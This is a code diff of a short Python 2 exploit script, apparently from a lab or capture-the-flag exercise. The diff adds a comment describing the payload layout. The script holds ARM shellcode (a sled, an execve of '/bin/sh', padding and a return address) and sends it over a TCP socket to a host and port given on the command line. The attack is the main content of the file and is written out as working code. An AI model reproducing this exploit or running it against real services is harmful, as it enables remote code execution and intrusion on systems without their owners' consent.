@@ -2,6 +2,9 @@
 
 import sys, socket
 
+
+# NoP + "/bin/sh" + AAAA + buffer_addr
+
 shellcode = ("\x01\x10\xa0\xe1"*67
 +"\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x03\xa0\x52\x40\xc2\x71\x05\xb4\x69\x46\x0b\x27\x01\xdf\x2d\x1c\x2f\x62\x69\x6e\x2f\x73\x68\x58"
 +"AAAA"+"\x74\xf0\xff\x7e")
@@ -11,7 +14,6 @@ shellcode = ("\x01\x10\xa0\xe1"*67
 if __name__ == "__main__":
     if len(sys.argv) != 3:
         print "./so.py  192.168.1.26  5555"
-    
     else:
         sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM,0)
         sock.connect(( sys.argv[1], int(sys.argv[2]) ))
